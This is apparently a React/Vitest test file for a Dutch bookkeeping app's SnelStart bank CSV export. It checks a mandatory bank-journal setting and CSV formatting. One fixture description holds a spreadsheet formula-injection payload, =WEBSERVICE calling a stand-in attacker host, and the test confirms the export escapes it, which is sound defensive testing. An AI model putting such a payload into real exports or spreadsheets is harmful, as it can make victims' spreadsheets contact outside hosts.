import { render, screen, fireEvent, waitFor, within } from "@testing-library/react";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { MemoryRouter } from "react-router-dom";
import type { ReactNode } from "react";

/**
 * Herstelpakket P6 — C-11: de SnelStart 12-bankexport op de pagina Bank
 * gebruikt alleen een expliciet ingesteld bankdagboek (`clients.bank_dagboek`).
 * Ontbreekt het, dan is de download geblokkeerd met een melding; er wordt niet
 * teruggevallen op 1100. Geen BOM, twee rijen per transactie en het overslaan
 * van regels zonder rekening blijven gelijk.
 *
 * Mockopbouw zoals `bank-ui.test.tsx`; `snelstart-export.ts` is echt.
 */

const state = vi.hoisted(() => ({
  transactions: [] as any[],
  clients: [] as any[],
  toasts: [] as any[],
}));

// De betaalschrijver (P5) gebruikt de React Query-client voor het verversen; deze
// test rendert Bank zonder QueryClientProvider en raakt geen koppelpad.
vi.mock("@/hooks/useBankPaymentLink", () => ({
  useBankPaymentLink: () => ({ link: vi.fn(), unlink: vi.fn(), refresh: vi.fn(async () => undefined) }),
}));
vi.mock("@/hooks/useBankMatchRejections", () => ({
  useBankMatchRejections: () => ({ data: [], isSuccess: true, isError: false }),
  useRecordBankMatchRejection: () => ({ mutateAsync: vi.fn(async () => undefined) }),
}));
vi.mock("@/hooks/useClientContext", () => ({
  useClientContext: () => ({ selectedClientId: "c1", setSelectedClientId: vi.fn() }),
}));
vi.mock("@/hooks/useActiveOrganization", () => ({
  useActiveOrganization: () => ({ activeOrganizationId: "org-1", isReady: true }),
}));
vi.mock("@/hooks/useClients", () => ({ useClients: () => ({ data: state.clients }) }));
vi.mock("@/hooks/useBankTransactions", () => ({
  BANK_TRANSACTIONS_PAGE_SIZE: 50,
  isServerFilterableBankStatus: (s: string) => ["all", "open", "gematcht", "handmatig"].includes(s),
  BANK_STATUS_MATCH_VALUES: {
    all: undefined,
    open: ["niet_gematcht", "suggestie"],
    gematcht: ["gematcht"],
    handmatig: ["handmatig_geboekt"],
  },
  bankSanitizeSearchTerm: (raw: string) => raw.trim(),
  useBankTransactions: () => ({ data: state.transactions, isLoading: false, isError: false, refetch: vi.fn() }),
  usePaginatedBankTransactions: () => ({
    data: { transactions: state.transactions, total: state.transactions.length },
    isLoading: false,
    isFetching: false,
    isError: false,
    isPlaceholderData: false,
    refetch: vi.fn(),
  }),
  useAddBankTransaction: () => ({ mutateAsync: vi.fn() }),
  useUpdateBankTransaction: () => ({ mutateAsync: vi.fn(() => Promise.resolve({})) }),
}));
vi.mock("@/hooks/usePurchaseInvoices", () => ({
  usePurchaseInvoices: () => ({ data: [], refetch: vi.fn() }),
  useUpdatePurchaseInvoice: () => ({ mutateAsync: vi.fn(() => Promise.resolve({})) }),
}));
vi.mock("@/hooks/useSalesInvoices", () => ({
  useSalesInvoices: () => ({ data: [], isLoading: false, isError: false, refetch: vi.fn() }),
  useUpdateSalesInvoice: () => ({ mutateAsync: vi.fn(() => Promise.resolve({})) }),
}));
vi.mock("@/hooks/useGrootboekrekeningen", () => ({
  useActiveGrootboekrekeningen: () => ({ data: [{ id: "gb-4400", nummer: 4400, omschrijving: "Kantoorkosten" }] }),
}));
vi.mock("@/hooks/useBookingTemplates", () => ({ useBookingTemplates: () => ({ data: [] }) }));
vi.mock("@/hooks/useVraagposten", () => ({
  useVraagposten: () => ({ data: [] }),
  useCreateVraagpost: () => ({ mutateAsync: vi.fn() }),
}));
vi.mock("@/hooks/useBankTransactionAllocations", () => ({
  useBankTransactionAllocations: () => ({ data: [] }),
  useUpsertBankTransactionAllocation: () => ({ mutateAsync: vi.fn() }),
  useDeleteAllocationsForTransaction: () => ({ mutateAsync: vi.fn() }),
}));
vi.mock("@/integrations/supabase/client", () => ({ supabase: { from: vi.fn(), rpc: vi.fn() } }));
vi.mock("@/components/BankMatchDialog", () => ({ BankMatchDialog: () => null, rankCandidates: () => [] }));
vi.mock("@/hooks/useBankLedgerStatus", () => ({ useBankLedgerStatus: () => ({ data: undefined }) }));
vi.mock("@/components/BankStatementUploadDialog", () => ({ BankStatementUploadDialog: () => null }));
vi.mock("@/components/BankAfletteringDrawer", () => ({ BankAfletteringDrawer: () => null }));
vi.mock("@/components/VerwerkingsScherm", () => ({ VerwerkingsScherm: () => null }));
vi.mock("@/components/CreateVraagpostDialog", () => ({ CreateVraagpostDialog: () => null }));
vi.mock("@/components/ClientMultiSelect", () => ({
  ClientMultiSelect: ({ value }: any) => <span data-testid="client-select">client={value.selectedIds.join(",")}</span>,
}));
vi.mock("@/components/GrootboekCombobox", () => ({ GrootboekCombobox: () => null }));
vi.mock("@/components/OrganizationSelector", () => ({ OrganizationSelector: () => null }));
vi.mock("@/hooks/use-toast", () => ({ useToast: () => ({ toast: (t: any) => { state.toasts.push(t); } }) }));

import Bank from "@/pages/Bank";
import { csvLines, downloads, installDownloadCapture } from "./support/snelstart-export-fakes";

const tx = (id: string, over: Record<string, any> = {}) => ({
  id,
  client_id: "c1",
  organization_id: "org-1",
  transaction_date: "2026-10-05",
  description: `Betaling ${id}`,
  reference: null,
  counter_account: null,
  counter_account_name: null,
  amount: -121,
  match_status: "handmatig_geboekt",
  match_confidence: null,
  matched_invoice_id: null,
  matched_invoice_type: null,
  grootboekrekening_id: "gb-4400",
  ledger_account: null,
  notes: null,
  ...over,
});

function renderBank() {
  render((<MemoryRouter initialEntries={["/bank?client=c1"]}><Bank /></MemoryRouter>) as ReactNode as any);
}

async function openPreflight() {
  fireEvent.click(screen.getByRole("button", { name: /Export Snelstart/ }));
  return screen.findByRole("dialog", { name: /Bankexport controleren/ });
}

beforeEach(() => {
  state.toasts.length = 0;
  state.transactions = [tx("t-1"), tx("t-2", { amount: 50, description: "=WEBSERVICE(\"https://evil.example\")" })];
  state.clients = [{ id: "c1", name: "Bakkerij Een BV", organization_id: "org-1", bank_dagboek: 1200 }];
  installDownloadCapture();
});

afterEach(() => {
  vi.restoreAllMocks();
});

describe("Bank — SnelStart 12-export met verplicht bankdagboek (C-11)", () => {
  it("zonder ingesteld dagboek: melding in de controle, download uit, geen bestand en geen 1100", async () => {
    state.clients = [{ id: "c1", name: "Bakkerij Een BV", organization_id: "org-1", bank_dagboek: null }];
    renderBank();
    const dialog = await openPreflight();
    expect(within(dialog).getByText(/Geen SnelStart-bankdagboek ingesteld/)).toBeInTheDocument();
    const download = within(dialog).getByRole("button", { name: /Download bankexport/ });
    expect(download).toBeDisabled();
    fireEvent.click(download);
    expect(downloads).toHaveLength(0);
  });

  it("met ingesteld dagboek: het bestand gebruikt dat dagboek, zonder BOM, twee rijen per transactie, omschrijving geneutraliseerd", async () => {
    renderBank();
    const dialog = await openPreflight();
    expect(within(dialog).queryByText(/Geen SnelStart-bankdagboek ingesteld/)).toBeNull();
    fireEvent.click(within(dialog).getByRole("button", { name: /Download bankexport/ }));
    await waitFor(() => expect(downloads).toHaveLength(1));
    expect(downloads[0].name).toBe("Bakkerij_Een_BV_banktransacties_snelstart.csv");
    const { bom, lines } = await csvLines(downloads[0]);
    expect(bom).toBe(false);
    expect(lines).toEqual([
      "fldDagboek;fldBoekingcode;fldDatum;fldGrootboeknummer;fldDebet;fldCredit;fldOmschrijving",
      "1200;1;05-10-2026;1200;0;121,00;Betaling t-1",
      "1200;1;05-10-2026;4400;121,00;0;Betaling t-1",
      "1200;2;05-10-2026;1200;50,00;0;'=WEBSERVICE(\"https://evil.example\")",
      "1200;2;05-10-2026;4400;0;50,00;'=WEBSERVICE(\"https://evil.example\")",
    ]);
    expect(lines.join("\n")).not.toContain("1100");
  });
});
